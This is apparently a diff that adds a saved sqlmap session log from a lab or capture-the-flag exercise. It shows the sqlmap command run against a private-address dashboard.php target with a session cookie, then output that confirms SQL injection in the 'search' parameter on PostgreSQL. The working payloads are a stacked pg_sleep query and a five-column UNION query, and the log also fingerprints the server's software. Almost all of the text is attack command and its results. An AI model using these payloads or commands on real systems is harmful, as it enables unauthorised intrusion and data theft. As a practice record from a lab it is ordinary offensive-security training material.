@@ -1,0 +1,28 @@
+sqlmap -u http://10.129.48.41/dashboard.php?search= --cookie="PHPSESSID=dg069s7ndaegcrhdp72funt677"
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.10.7#stable}
+|_ -| . [']     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[*] starting @ 10:59:15 /2026-08-18/
+
+[10:59:15] [INFO] resuming back-end DBMS 'postgresql'
+[10:59:15] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: search (GET)
+    Type: stacked queries
+    Title: PostgreSQL > 8.1 stacked queries (comment)
+    Payload: search=';SELECT PG_SLEEP(5)--
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: search=' UNION ALL SELECT NULL,(CHR(113)||CHR(106)||CHR(112)||CHR(113)||CHR(113))||(CHR(78)||CHR(77)||CHR(81)),NULL,NULL,NULL-- HcSB
+---
+[10:59:15] [INFO] the back-end DBMS is PostgreSQL
+web server operating system: Linux Ubuntu 20.04 or 19.10 or 20.10 (focal or eoan)
+web application technology: Apache 2.4.41
+back-end DBMS: PostgreSQL
+[*] ending @ 10:59:15 /2026-08-18/
